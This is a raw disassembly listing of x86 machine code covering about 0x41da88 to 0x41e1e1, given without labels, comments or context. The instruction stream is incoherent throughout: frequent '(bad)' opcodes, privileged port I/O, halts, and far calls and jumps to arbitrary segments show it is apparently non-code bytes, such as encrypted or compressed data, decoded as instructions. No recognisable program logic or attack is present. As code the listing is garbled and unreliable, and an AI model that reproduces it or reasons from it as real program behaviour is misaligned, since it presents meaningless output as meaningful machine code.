  41da88:	sub    al,0xc6
  41da8a:	sbb    al,0x37
  41da8c:	std    
  41da8d:	or     ecx,DWORD PTR [edi-0x203f3026]
  41da93:	cmp    eax,0x8efdec38
  41da98:	jecxz  0x41dab9
  41da9a:	push   0xf3e91b7a
  41da9f:	in     eax,0xd8
  41daa1:	out    0x2d,eax
  41daa3:	jns    0x41dac4
  41daa5:	leave  
  41daa6:	cmp    al,0xe0
  41daa8:	push   cs
  41daa9:	push   0x3e
  41daab:	dec    ebp
  41daac:	div    BYTE PTR [eax]
  41daae:	icebp  
  41daaf:	sbb    al,0x2
  41dab1:	jne    0x41da3b
  41dab3:	repz fbld TBYTE PTR [ecx]
  41dab6:	or     eax,0x5bb8a4d6
  41dabb:	adc    dh,BYTE PTR [edi]
  41dabd:	call   0x1d25:0xa4d09094
  41dac4:	inc    esi
  41dac5:	add    eax,0xc95d6889
  41daca:	test   al,0xb
  41dacc:	dec    esp
  41dacd:	and    bh,BYTE PTR [ebp+0x40]
  41dad0:	movq   QWORD PTR [edx+ecx*2+0x7f],mm5
  41dad5:	dec    esi
  41dad6:	or     eax,0x93c888f4
  41dadb:	cli    
  41dadc:	xchg   ecx,eax
  41dadd:	push   edi
  41dade:	sbb    edi,ebx
  41dae0:	push   esp
  41dae1:	pop    ebp
  41dae2:	(bad)  [ebx-0x79c9ace5]
  41dae8:	jge    0x41db5f
  41daea:	mov    ch,0x30
  41daec:	popw   es
  41daee:	xor    ebp,edx
  41daf0:	ja     0x41db2b
  41daf2:	or     DWORD PTR [edi+0x55606a38],ecx
  41daf8:	xchg   eax,esi
  41dafa:	repnz add al,ah
  41dafd:	xchg   ebx,eax
  41dafe:	scas   eax,DWORD PTR es:[edi]
  41daff:	popf   
  41db00:	jno    0x41db35
  41db02:	out    dx,eax
  41db03:	jnp    0x41daa9
  41db05:	(bad)  
  41db06:	(bad)  
  41db07:	jge    0x41db1e
  41db09:	push   ss
  41db0a:	mov    esi,0xc7412cdb
  41db0f:	rcr    BYTE PTR [ebx+0x38],1
  41db12:	jmp    0x41db8f
  41db14:	pop    edi
  41db15:	dec    esp
  41db16:	add    eax,0x1c39f4aa
  41db1b:	sub    bh,ch
  41db1d:	jmp    0x41dabf
  41db1f:	sub    DWORD PTR [edx-0x71],esi
  41db22:	mov    eax,ds:0x6d133c09
  41db27:	shl    BYTE PTR [ebx],cl
  41db29:	vpunpckhwd xmm7,xmm5,XMMWORD PTR [ebx-0x5b2e172d]
  41db31:	(bad)  
  41db32:	stos   DWORD PTR es:[edi],eax
  41db33:	push   edi
  41db34:	push   eax
  41db35:	push   ecx
  41db36:	mov    dh,0x90
  41db38:	or     edi,edx
  41db3a:	mov    bh,0x18
  41db3c:	or     eax,0xddba65d3
  41db41:	test   eax,0xf85c423c
  41db46:	and    DWORD PTR [eax],edx
  41db48:	adc    edi,DWORD PTR [esi]
  41db4a:	push   0x61
  41db4c:	sbb    al,BYTE PTR [esi]
  41db4e:	clc    
  41db4f:	mov    edx,0xce66fddb
  41db54:	cmp    ecx,DWORD PTR [edi-0x768a5702]
  41db5a:	sbb    ah,BYTE PTR [eax+0x16470f86]
  41db60:	mov    ah,0x42
  41db62:	retf   
  41db63:	test   al,0xe8
  41db65:	ret    
  41db66:	data16 jge 0x41db83
  41db69:	hlt    
  41db6a:	aam    0x83
  41db6c:	dec    eax
  41db6d:	sbb    BYTE PTR [ecx+0x32d1750],dh
  41db73:	mov    bh,0x88
  41db75:	out    dx,eax
  41db76:	dec    esi
  41db77:	xchg   esi,eax
  41db78:	sub    al,0x80
  41db7a:	sbb    al,0xcb
  41db7c:	out    dx,al
  41db7d:	pop    ecx
  41db7e:	pop    ss
  41db7f:	fmul   QWORD PTR [ecx-0x5fee31b1]
  41db85:	jle    0x41dbbb
  41db87:	imul   esi,DWORD PTR [edi+ecx*1-0x24],0x4f706df1
  41db8f:	rcr    DWORD PTR [ecx-0x25],1
  41db92:	lods   eax,DWORD PTR ds:[esi]
  41db93:	xchg   DWORD PTR [esi+ecx*1],ebx
  41db96:	data16 ror BYTE PTR [ecx-0x50],1
  41db9a:	sbb    eax,DWORD PTR ds:0xf11c9056
  41dba0:	mov    cl,BYTE PTR [edx]
  41dba2:	iret   
  41dba3:	ja     0x41db49
  41dba5:	pop    ss
  41dba6:	mov    ebx,0x44de68ca
  41dbab:	or     al,0xff
  41dbad:	adc    ebp,esi
  41dbaf:	xchg   ebx,eax
  41dbb0:	inc    edx
  41dbb1:	scas   eax,DWORD PTR es:[edi]
  41dbb2:	sbb    al,0xea
  41dbb4:	xchg   edi,eax
  41dbb5:	xor    BYTE PTR [eax+eax*2+0x290cc217],ch
  41dbbc:	pop    edx
  41dbbd:	(bad)  
  41dbbe:	stos   DWORD PTR es:[edi],eax
  41dbbf:	ins    DWORD PTR es:[edi],dx
  41dbc0:	mov    edx,0xf3186abb
  41dbc5:	add    DWORD PTR [edi-0x59],esp
  41dbc8:	pop    eax
  41dbc9:	and    dh,BYTE PTR [edx+ecx*4-0xc]
  41dbcd:	outs   dx,DWORD PTR ds:[esi]
  41dbce:	(bad)
  41dbd1:	fbstp  TBYTE PTR [ebx+0x197681c5]
  41dbd7:	adc    al,0xee
  41dbd9:	call   0xe706:0xee067419
  41dbe0:	mov    ah,0x78
  41dbe2:	fdivr  DWORD PTR [edx+0x16]
  41dbe5:	add    DWORD PTR [ecx],ebp
  41dbe7:	adc    eax,0x608340e1
  41dbec:	das    
  41dbed:	sahf   
  41dbee:	into   
  41dbef:	les    esi,FWORD PTR [eax+0x3d2ea5dd]
  41dbf5:	cld    
  41dbf6:	pop    eax
  41dbf7:	(bad)  
  41dbf8:	fimul  WORD PTR [ebx+ebp*1]
  41dbfb:	xchg   ebx,eax
  41dbfc:	hlt    
  41dbfd:	retf   0xf70f
  41dc00:	arpl   WORD PTR [esi-0x1953f954],di
  41dc06:	in     eax,0x65
  41dc08:	int3   
  41dc09:	cld    
  41dc0a:	or     BYTE PTR [edx],ch
  41dc0c:	pop    esp
  41dc0d:	in     al,dx
  41dc0e:	sub    dl,ch
  41dc10:	mov    al,0x1a
  41dc12:	and    al,0x82
  41dc14:	adc    DWORD PTR [edi-0x357c680f],eax
  41dc1a:	outs   dx,DWORD PTR ds:[esi]
  41dc1b:	push   edi
  41dc1c:	jo     0x41dbdb
  41dc1e:	aam    0xfa
  41dc20:	push   edx
  41dc21:	and    ecx,edx
  41dc23:	inc    ebx
  41dc24:	push   0x43
  41dc26:	xchg   DWORD PTR [esi*8+0x191b362],esp
  41dc2d:	xchg   edi,eax
  41dc2e:	jbe    0x41dc77
  41dc30:	fbstp  TBYTE PTR [edx+0x2c]
  41dc33:	add    BYTE PTR [edi+edi*1+0x4],ch
  41dc37:	adc    ecx,ecx
  41dc39:	rcr    BYTE PTR ds:0xcd4bd989,0xff
  41dc40:	add    BYTE PTR [ebx],ah
  41dc42:	jo     0x41dc81
  41dc44:	addr16 ss push ss
  41dc47:	lods   al,BYTE PTR ds:[esi]
  41dc48:	mov    eax,ds:0xec60b224
  41dc4d:	call   0xb00ab27a
  41dc52:	fidivr WORD PTR [edi]
  41dc54:	div    DWORD PTR [edx-0x28]
  41dc57:	popf   
  41dc58:	outs   dx,BYTE PTR ds:[esi]
  41dc59:	stos   BYTE PTR es:[edi],al
  41dc5a:	std    
  41dc5b:	or     al,BYTE PTR [di]
  41dc5e:	shl    ebp,cl
  41dc60:	scas   al,BYTE PTR es:[edi]
  41dc61:	xchg   ecx,eax
  41dc62:	jp     0x41dc9d
  41dc64:	dec    ebx
  41dc65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc66:	jmp    0x2b08:0x5f614ae2
  41dc6d:	jae    0x41dc8d
  41dc6f:	mov    ds:0xb52cf8dd,al
  41dc74:	mov    al,0xab
  41dc76:	test   bh,0x49
  41dc79:	retf   0x6442
  41dc7c:	add    al,0x21
  41dc7e:	ja     0x41dc52
  41dc80:	jo     0x41dc0f
  41dc82:	popf   
  41dc83:	and    ebx,DWORD PTR [ebx]
  41dc85:	fmul   QWORD PTR [edi]
  41dc87:	dec    ecx
  41dc88:	jg     0x41dcf5
  41dc8a:	sub    bl,BYTE PTR [edx]
  41dc8c:	and    DWORD PTR cs:[eax+0x11],esp
  41dc90:	(bad)  
  41dc91:	sbb    BYTE PTR [eax],dh
  41dc93:	fcom   DWORD PTR [ebx]
  41dc95:	je     0x41dc37
  41dc97:	outs   dx,DWORD PTR ds:[esi]
  41dc98:	adc    al,0x24
  41dc9a:	dec    edx
  41dc9b:	push   esi
  41dc9c:	fiadd  WORD PTR [edi+0x6c]
  41dc9f:	cld    
  41dca0:	xchg   ebp,eax
  41dca1:	test   DWORD PTR [eax],eax
  41dca3:	dec    ebp
  41dca4:	icebp  
  41dca5:	fwait
  41dca6:	and    DWORD PTR [edx],edi
  41dca8:	adc    eax,0x249156e5
  41dcad:	or     ecx,ecx
  41dcaf:	sub    al,0x77
  41dcb1:	shl    BYTE PTR [ebp-0x31],1
  41dcb4:	rcr    BYTE PTR [ebx],cl
  41dcb6:	or     eax,0x340fd0ba
  41dcbb:	mov    cl,BYTE PTR [edx+0x75081a6d]
  41dcc1:	fdiv   QWORD PTR [esi+ebx*1]
  41dcc4:	sub    bh,dh
  41dcc6:	xchg   ebx,eax
  41dcc7:	daa    
  41dcc8:	hlt    
  41dcc9:	push   eax
  41dcca:	fwait
  41dccb:	gs xchg esp,eax
  41dccd:	test   DWORD PTR [ebx+0x77],edx
  41dcd0:	shl    BYTE PTR [ecx],cl
  41dcd2:	push   esi
  41dcd3:	cwde   
  41dcd4:	or     bh,BYTE PTR [ebp+0x56]
  41dcd7:	push   ecx
  41dcd8:	sub    dl,BYTE PTR [eax]
  41dcda:	jmp    0x3e286a61
  41dcdf:	cmp    ch,al
  41dce1:	jno    0x41dca4
  41dce3:	mov    ds:0x295a2e21,al
  41dce8:	push   0xc83d62b8
  41dced:	jge    0x41dc72
  41dcef:	mov    ds:0xe5b23ab5,al
  41dcf4:	dec    esp
  41dcf5:	or     BYTE PTR [esi-0x5d],0xa2
  41dcf9:	loop   0x41dcf9
  41dcfb:	test   al,0xda
  41dcfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcfe:	daa    
  41dcff:	ja     0x41dd63
  41dd01:	push   ss
  41dd02:	sar    BYTE PTR [esi-0x4f0a4092],0x89
  41dd09:	sub    al,0x2b
  41dd0b:	mov    al,fs:0xbdc55b82
  41dd11:	or     dh,BYTE PTR [edi]
  41dd13:	sub    BYTE PTR [esi+0x9],ch
  41dd16:	mov    al,0x37
  41dd18:	idiv   DWORD PTR [edi]
  41dd1a:	jmp    0xd148:0xce76bc57
  41dd21:	outs   dx,BYTE PTR ds:[esi]
  41dd22:	(bad)  
  41dd23:	test   bh,0x44
  41dd26:	fldcw  WORD PTR [ebp-0x47]
  41dd29:	fistp  QWORD PTR ds:0xe786b044
  41dd2f:	xchg   esp,eax
  41dd30:	repz push ds
  41dd32:	test   BYTE PTR [edx+0xe],0x5d
  41dd36:	es jne 0x41dcf6
  41dd39:	push   edx
  41dd3a:	sub    eax,0x4c8b27ce
  41dd3f:	pop    es
  41dd40:	pop    edx
  41dd41:	dec    edi
  41dd42:	xchg   ebx,eax
  41dd43:	fsubr  DWORD PTR [eax+0x6fa034cc]
  41dd49:	loope  0x41dd84
  41dd4b:	push   edx
  41dd4c:	adc    eax,0xf4fd4e99
  41dd51:	jbe    0x41dd20
  41dd53:	dec    edi
  41dd54:	add    eax,DWORD PTR ds:0x2043eff2
  41dd5a:	push   esp
  41dd5b:	adc    eax,0x73d658bc
  41dd60:	lea    edx,[ebp+0x73]
  41dd63:	hlt    
  41dd64:	mov    ss,WORD PTR [edx+0x64]
  41dd67:	scas   eax,DWORD PTR es:[edi]
  41dd68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd69:	psllw  mm4,0x84
  41dd6d:	fimul  WORD PTR ds:0x2bc9489d
  41dd73:	jle    0x41ddeb
  41dd75:	xor    DWORD PTR [eax+0x37],esp
  41dd78:	and    BYTE PTR [eax+0x7eae6729],cl
  41dd7e:	rcr    BYTE PTR [eax+0x72],cl
  41dd81:	fisubr DWORD PTR [eax]
  41dd83:	or     ecx,eax
  41dd85:	mov    bl,0x16
  41dd87:	cmp    ah,BYTE PTR [edx]
  41dd89:	mov    eax,ds:0x1edcf0b8
  41dd8e:	mov    cl,0xe2
  41dd90:	cmp    esi,DWORD PTR [edi-0x1b]
  41dd93:	sbb    dh,BYTE PTR ds:0x5e675d0b
  41dd99:	xchg   edx,eax
  41dd9a:	sti    
  41dd9b:	push   edx
  41dd9c:	setl   BYTE PTR [edx-0x7a]
  41dda0:	dec    esp
  41dda1:	adc    edi,esi
  41dda3:	push   ebp
  41dda4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dda5:	inc    ebx
  41dda6:	mov    BYTE PTR [ebp-0x1],al
  41dda9:	adc    edi,DWORD PTR [eax+0x59]
  41ddac:	js     0x41de1b
  41ddae:	js     0x41ddf9
  41ddb0:	push   ss
  41ddb1:	scas   al,BYTE PTR es:[edi]
  41ddb2:	mov    al,cs:0xe954ad4
  41ddb8:	cmp    dl,cl
  41ddba:	call   0x77c9514b
  41ddbf:	xchg   esi,eax
  41ddc0:	add    ecx,DWORD PTR [eax-0x27]
  41ddc3:	xchg   edi,eax
  41ddc4:	sbb    BYTE PTR [edi],al
  41ddc6:	and    DWORD PTR [esi-0xd8df8d2],eax
  41ddcc:	xor    BYTE PTR [ebp+esi*1+0x70],ch
  41ddd0:	sub    al,0x95
  41ddd2:	jmp    0x41dd7f
  41ddd4:	sub    al,BYTE PTR [ebx]
  41ddd6:	test   al,0x7e
  41ddd8:	push   cs
  41ddd9:	(bad)  
  41ddda:	int3   
  41dddb:	xor    DWORD PTR [ebp-0x80],edx
  41ddde:	mov    ecx,0xd783bf5e
  41dde3:	je     0x41dd76
  41dde5:	cmp    BYTE PTR [edx+0x517cede9],cl
  41ddeb:	dec    esi
  41ddec:	call   0xd90c55af
  41ddf1:	or     al,0x5f
  41ddf3:	cli    
  41ddf4:	out    dx,al
  41ddf5:	imul   eax,DWORD PTR [esp+ebx*1+0x18489cb4],0x9e6b6ab6
  41de00:	sar    BYTE PTR [ecx],0xf6
  41de03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de04:	scas   al,BYTE PTR es:[edi]
  41de05:	mov    ds:0x33c21086,eax
  41de0a:	sub    eax,0x2028fba9
  41de0f:	sbb    DWORD PTR [esi],edx
  41de11:	(bad)  
  41de12:	(bad)  
  41de13:	adc    eax,0xc512cdea
  41de18:	push   es
  41de19:	mov    al,ds:0x6b5c4fbf
  41de1e:	lock mov eax,DWORD PTR [eax-0x25]
  41de22:	sub    dh,BYTE PTR [edx-0x7433e1ad]
  41de28:	dec    edi
  41de29:	stos   DWORD PTR es:[edi],eax
  41de2a:	std    
  41de2b:	hlt    
  41de2c:	mov    dl,0xfc
  41de2e:	mov    eax,ds:0x8a3ce7c
  41de33:	sbb    cl,0xf0
  41de36:	mov    ds:0xe6900f0d,eax
  41de3b:	test   ecx,eax
  41de3d:	and    al,0xc
  41de3f:	sbb    DWORD PTR [ebp+0x1aa66b7e],0xb79105f6
  41de49:	js     0x41de7b
  41de4b:	test   eax,0x73f163f2
  41de50:	bound  esp,QWORD PTR [ecx+0x7b]
  41de53:	mov    eax,0x4b505e77
  41de58:	dec    ebx
  41de59:	mov    cl,0xbc
  41de5b:	jg     0x41de76
  41de5d:	cmp    DWORD PTR [edi+0x2c],ecx
  41de60:	xchg   esp,eax
  41de61:	jns    0x41de65
  41de63:	in     eax,0x84
  41de65:	sti    
  41de66:	mov    WORD PTR [ecx+0x2e],?
  41de69:	ins    BYTE PTR es:[edi],dx
  41de6a:	jno    0x41de66
  41de6c:	mov    al,0xd9
  41de6e:	cmp    eax,0x6d5c119e
  41de73:	pop    edx
  41de74:	jns    0x41de9c
  41de76:	push   esi
  41de77:	in     eax,0xf8
  41de79:	mov    bh,0xc0
  41de7b:	enter  0x7078,0x5
  41de7f:	and    eax,0x1e372da7
  41de84:	sub    al,0xc8
  41de86:	add    ecx,esi
  41de88:	mov    bh,0xba
  41de8a:	daa    
  41de8b:	inc    DWORD PTR [edi-0x408be654]
  41de91:	int3   
  41de92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de93:	mov    dl,0x5e
  41de95:	xlat   BYTE PTR ds:[ebx]
  41de96:	clc    
  41de97:	in     eax,dx
  41de98:	inc    eax
  41de99:	cmp    cl,BYTE PTR [eax-0x4d53f17e]
  41de9f:	push   es
  41dea0:	rcl    cl,0x6e
  41dea3:	push   edi
  41dea4:	in     eax,dx
  41dea5:	jp     0x41deca
  41dea7:	add    BYTE PTR [ebp-0x670221f6],bh
  41dead:	jecxz  0x41de83
  41deaf:	(bad)  
  41deb0:	sbb    BYTE PTR [edi-0x53],cl
  41deb3:	call   0x6c97:0x158ffbb5
  41deba:	add    BYTE PTR [ebx-0x258da595],cl
  41dec0:	js     0x41de9c
  41dec2:	add    eax,0x8aec9102
  41dec7:	(bad)  
  41dec8:	outs   dx,DWORD PTR ds:[esi]
  41dec9:	dec    edi
  41deca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41decb:	mov    cs,WORD PTR [eax+0x60]
  41dece:	add    eax,0x35a38830
  41ded3:	mov    al,0x5d
  41ded5:	dec    BYTE PTR [edi-0x4f520df5]
  41dedb:	ds in  eax,dx
  41dedd:	xchg   DWORD PTR [ebx-0x7e],edx
  41dee0:	repz cwde 
  41dee2:	jnp    0x41df61
  41dee4:	mov    dh,0x43
  41dee6:	jge    0x41dece
  41dee8:	add    al,0x38
  41deea:	pop    edi
  41deeb:	icebp  
  41deec:	adc    eax,0x5263241d
  41def1:	sub    al,0x43
  41def3:	fstp   DWORD PTR [esi-0x1d91aa60]
  41def9:	or     eax,0x6d457774
  41defe:	adc    al,0x58
  41df00:	in     al,dx
  41df01:	dec    edi
  41df02:	out    dx,eax
  41df03:	std    
  41df04:	mov    bh,0x29
  41df06:	stos   DWORD PTR es:[edi],eax
  41df07:	in     al,dx
  41df08:	adc    eax,0x4fbad5f9
  41df0d:	into   
  41df0e:	aaa    
  41df0f:	push   ds
  41df10:	mov    cl,0xd5
  41df12:	xchg   dl,al
  41df14:	xor    eax,DWORD PTR [edx]
  41df16:	push   ss
  41df17:	sbb    eax,DWORD PTR [esi-0xe]
  41df1a:	stos   BYTE PTR es:[edi],al
  41df1b:	pop    ebx
  41df1c:	ds sbb ecx,eax
  41df1f:	ja     0x41df49
  41df21:	retf   0x9e6a
  41df24:	repnz stos DWORD PTR es:[edi],eax
  41df26:	outs   dx,DWORD PTR ds:[esi]
  41df27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df28:	and    esi,DWORD PTR [edi+0x2713fea0]
  41df2e:	sbb    eax,DWORD PTR [ebx]
  41df30:	mov    dh,0xfb
  41df32:	test   DWORD PTR [edi-0x7b],0xa7aba9d0
  41df39:	es sar bl,1
  41df3c:	inc    esp
  41df3d:	push   edx
  41df3e:	and    DWORD PTR ds:0x91a91d13,0x22d5c042
  41df48:	imul   edi,DWORD PTR [ebx+0x60],0xffffff8f
  41df4c:	mov    bl,0x99
  41df4e:	jg     0x41dee9
  41df50:	or     DWORD PTR [ebx],edi
  41df52:	mov    ebx,0x870e5d73
  41df57:	or     bh,BYTE PTR [esp+edi*1-0x1826e417]
  41df5e:	sbb    dh,ch
  41df60:	push   eax
  41df61:	mov    al,ds:0xff39570d
  41df66:	stos   DWORD PTR es:[edi],eax
  41df67:	adc    edx,DWORD PTR ss:[eax+0x18651288]
  41df6e:	stos   BYTE PTR es:[edi],al
  41df6f:	add    DWORD PTR [ebx-0x64],edx
  41df72:	mov    ds:0x38145511,al
  41df77:	inc    esi
  41df78:	pop    edx
  41df79:	call   0xfbce:0x468f9720
  41df80:	out    0xc7,eax
  41df82:	push   ss
  41df83:	lods   eax,DWORD PTR ds:[esi]
  41df84:	push   ss
  41df85:	test   al,0xbd
  41df87:	push   es
  41df88:	mov    edx,0x685f1e97
  41df8d:	push   edi
  41df8e:	pop    ebx
  41df8f:	(bad)  
  41df90:	or     al,0x3a
  41df92:	adc    al,0xed
  41df94:	xor    ebp,eax
  41df96:	add    BYTE PTR [ebx-0x23],cl
  41df99:	iret   
  41df9a:	jne    0x41df9b
  41df9c:	and    BYTE PTR [esp+edx*4-0x4c],cl
  41dfa0:	lods   al,BYTE PTR ds:[esi]
  41dfa1:	jbe    0x41e00b
  41dfa3:	and    eax,0x6f6f7314
  41dfa8:	inc    ebp
  41dfa9:	or     edx,esi
  41dfab:	pop    edx
  41dfac:	mov    esi,0xa5592118
  41dfb1:	push   ebp
  41dfb2:	mov    edi,0xce775cb1
  41dfb7:	mov    bl,0xb4
  41dfb9:	dec    esp
  41dfba:	ds int 0x5e
  41dfbd:	shl    BYTE PTR [ebx],0x3a
  41dfc0:	mov    edi,0x5fbce3c4
  41dfc5:	fld    TBYTE PTR [eax-0x56b3992b]
  41dfcb:	and    bh,BYTE PTR [esp+ebx*1-0x60]
  41dfcf:	ror    DWORD PTR [eax+0x35e79b40],1
  41dfd5:	loopne 0x41e01a
  41dfd7:	push   0x20
  41dfd9:	out    0x58,al
  41dfdb:	xchg   ebx,eax
  41dfdc:	in     al,dx
  41dfdd:	lds    edi,FWORD PTR [ebx]
  41dfdf:	retf   
  41dfe0:	xor    BYTE PTR [ebp+eiz*4-0x16],ah
  41dfe4:	not    BYTE PTR [edi+0x23dc9ad0]
  41dfea:	lock push DWORD PTR ds:0xcecb038
  41dff1:	sub    eax,0xac21d3cc
  41dff6:	in     al,dx
  41dff7:	or     edi,DWORD PTR [ebx]
  41dff9:	mov    dh,0xcb
  41dffb:	dec    edi
  41dffc:	scas   al,BYTE PTR es:[edi]
  41dffd:	xor    edi,DWORD PTR [edx]
  41dfff:	clc    
  41e000:	sbb    ah,BYTE PTR [edi+0x25b22cd4]
  41e006:	mov    ch,0x7e
  41e008:	icebp  
  41e009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e00a:	pop    ds
  41e00b:	or     ebx,DWORD PTR [ecx+0x455fa2ed]
  41e011:	dec    esi
  41e012:	out    dx,eax
  41e013:	ss mov ah,0x2b
  41e016:	fmul   DWORD PTR [esi-0x14949ae9]
  41e01c:	jmp    DWORD PTR [esi-0x1f291de]
  41e022:	jae    0x41e092
  41e024:	fdiv   QWORD PTR [ebx]
  41e026:	or     bl,al
  41e028:	inc    eax
  41e029:	retf   0x7053
  41e02c:	mov    ebx,DWORD PTR [eax]
  41e02e:	dec    ebx
  41e02f:	push   es
  41e030:	sub    DWORD PTR [ebx],0xbea11a46
  41e036:	test   BYTE PTR [edx+0x49],ch
  41e039:	mov    edx,0xef2cd798
  41e03e:	pop    esp
  41e03f:	jb     0x41e097
  41e041:	loopne 0x41e002
  41e043:	cmp    eax,0x47f83b4c
  41e048:	js     0x41e0a9
  41e04a:	add    al,BYTE PTR [ebx+0x2c]
  41e04d:	stos   DWORD PTR es:[edi],eax
  41e04e:	ret    0x663b
  41e051:	iret   
  41e052:	fwait
  41e053:	jecxz  0x41e092
  41e055:	ins    DWORD PTR es:[edi],dx
  41e056:	(bad)  
  41e057:	clc    
  41e058:	xchg   esi,eax
  41e059:	sbb    eax,0x85f447af
  41e05e:	sbb    DWORD PTR [ecx],ecx
  41e060:	pop    ds
  41e061:	push   ebp
  41e062:	out    0x4e,al
  41e064:	mov    eax,ds:0x68ce6d61
  41e069:	lea    eax,[ebp-0x3f]
  41e06c:	mov    WORD PTR [ecx-0x20],fs
  41e06f:	sahf   
  41e070:	jne    0x41e032
  41e072:	or     eax,0x99588c2d
  41e077:	int    0x2b
  41e079:	imul   edx,DWORD PTR [eax],0xbe67d7c0
  41e07f:	add    eax,0x7d090946
  41e084:	fs jno 0x41e0d1
  41e087:	not    dl
  41e089:	push   eax
  41e08a:	or     BYTE PTR [esi],cl
  41e08c:	sub    ecx,DWORD PTR [ebp+0x4b]
  41e08f:	xchg   ecx,edx
  41e091:	or     esi,DWORD PTR [ebx+0x20050f0b]
  41e097:	or     ah,0xbc
  41e09a:	arpl   WORD PTR [esi+0x53fab6e4],si
  41e0a0:	sub    esi,DWORD PTR [edi]
  41e0a2:	pop    esp
  41e0a3:	aad    0xdf
  41e0a5:	mov    BYTE PTR [edx],0xfd
  41e0a8:	push   eax
  41e0a9:	(bad)  [esi+0x2b]
  41e0ac:	sub    DWORD PTR [ebp+eiz*4+0x52],esi
  41e0b0:	xor    dl,BYTE PTR [eax]
  41e0b2:	xor    ebp,esi
  41e0b4:	inc    edi
  41e0b5:	pop    eax
  41e0b6:	(bad)  
  41e0b7:	jge    0x41e104
  41e0b9:	out    dx,al
  41e0ba:	(bad)  
  41e0bb:	sar    BYTE PTR [edi+0x41],cl
  41e0be:	sar    BYTE PTR [edx+0x61eae4b6],0xfa
  41e0c5:	xchg   ebx,eax
  41e0c6:	jl     0x41e08a
  41e0c8:	adc    eax,0x731124f7
  41e0cd:	in     al,dx
  41e0ce:	into   
  41e0cf:	in     eax,0x58
  41e0d1:	mov    ah,0xe9
  41e0d3:	shl    DWORD PTR [ebx],cl
  41e0d5:	cdq    
  41e0d6:	(bad)  
  41e0d7:	daa    
  41e0d8:	sbb    al,0xf5
  41e0da:	push   edi
  41e0db:	pop    es
  41e0dc:	cmp    cl,BYTE PTR [ecx]
  41e0de:	das    
  41e0df:	and    ebx,edx
  41e0e1:	pusha  
  41e0e2:	or     bh,BYTE PTR [edi-0x4c]
  41e0e5:	in     eax,dx
  41e0e6:	jl     0x41e071
  41e0e8:	in     al,0x4d
  41e0ea:	int3   
  41e0eb:	and    al,0xa9
  41e0ed:	sub    edi,ebp
  41e0ef:	lods   eax,DWORD PTR ds:[esi]
  41e0f0:	xchg   ebp,eax
  41e0f1:	out    0x29,al
  41e0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0f4:	shl    BYTE PTR [eax+0x29],1
  41e0f7:	out    0x45,al
  41e0f9:	ret    0xdcc4
  41e0fc:	leave  
  41e0fd:	pop    es
  41e0fe:	and    cl,bh
  41e100:	adc    DWORD PTR [esi+0xe15df9a],ebx
  41e106:	jp     0x41e0c5
  41e108:	sub    esp,DWORD PTR [esp+ebp*2]
  41e10b:	enter  0xb0c9,0xa1
  41e10f:	dec    edi
  41e110:	sbb    DWORD PTR [ebx+ecx*8],ebp
  41e113:	pop    es
  41e114:	xor    al,0xc0
  41e116:	xor    DWORD PTR [ecx],ebx
  41e118:	fstp   DWORD PTR [esi+0x7f8f4351]
  41e11e:	or     al,0xc2
  41e120:	inc    ebx
  41e121:	test   edx,0xc65a5c6
  41e127:	fiadd  WORD PTR [eax-0x10]
  41e12a:	dec    esp
  41e12b:	xchg   ebp,eax
  41e12c:	xlat   BYTE PTR ds:[ebx]
  41e12d:	jg     0x41e0e3
  41e12f:	loopne 0x41e0b1
  41e131:	pop    esi
  41e132:	mov    eax,0x967c07a9
  41e137:	dec    eax
  41e138:	xlat   BYTE PTR ds:[ebx]
  41e139:	add    ebp,ecx
  41e13b:	sbb    BYTE PTR [esi+ebp*8-0x62],0xc6
  41e140:	pop    esp
  41e141:	(bad)  
  41e142:	push   esp
  41e143:	cmp    eax,0xd29c672c
  41e148:	in     al,dx
  41e149:	fld    DWORD PTR [ebx]
  41e14b:	dec    esi
  41e14c:	inc    ebp
  41e14d:	popf   
  41e14e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e14f:	mov    bh,0x9a
  41e151:	pop    edx
  41e152:	xchg   BYTE PTR [edi-0xc083d79],dh
  41e158:	imul   edx,DWORD PTR [eax],0x4e
  41e15b:	cmp    ecx,DWORD PTR [ecx]
  41e15d:	jbe    0x41e1cd
  41e15f:	pop    edx
  41e160:	mov    esp,0xaa4316eb
  41e165:	jb     0x41e176
  41e167:	imul   esi,DWORD PTR [eax-0x5a],0x1b
  41e16b:	cmp    al,0x68
  41e16d:	or     ah,BYTE PTR [eax-0x26467b97]
  41e173:	daa    
  41e174:	mov    edx,0x78975a23
  41e179:	setno  BYTE PTR ds:0x8d917bae
  41e180:	mov    edx,0xc6ce2248
  41e185:	mov    edx,0xa3ea841a
  41e18a:	shl    BYTE PTR [ecx+eiz*2+0x1c],cl
  41e18e:	outs   dx,DWORD PTR ds:[esi]
  41e18f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e190:	mov    ebx,0x693ac41f
  41e195:	mov    edx,ebx
  41e197:	dec    ebp
  41e198:	int    0xc9
  41e19a:	out    dx,eax
  41e19b:	jo     0x41e137
  41e19d:	jmp    DWORD PTR [ebx+0x3cdd6c22]
  41e1a3:	stos   DWORD PTR es:[edi],eax
  41e1a4:	hlt    
  41e1a5:	jmp    0x6d58:0x8c242d00
  41e1ac:	add    DWORD PTR [ecx-0x6f],0x83829f5f
  41e1b3:	daa    
  41e1b4:	cmp    eax,0xdfff7ac0
  41e1b9:	sub    dh,cl
  41e1bb:	lahf   
  41e1bc:	test   eax,0x4524d481
  41e1c1:	fcmovbe st,st(6)
  41e1c3:	xchg   edi,eax
  41e1c4:	push   es
  41e1c5:	add    DWORD PTR [ecx+0x2f],eax
  41e1c8:	rol    BYTE PTR [eax+0x1f],cl
  41e1cb:	(bad)  
  41e1cc:	cld    
  41e1cd:	imul   DWORD PTR [edx]
  41e1cf:	adc    BYTE PTR [ecx+ecx*4-0x3af05f25],ah
  41e1d6:	xor    al,0xe4
  41e1d8:	push   es
  41e1d9:	retf   
  41e1da:	call   0xcf8d:0x54c6596f
  41e1e1:	loopne 0x41e1dc
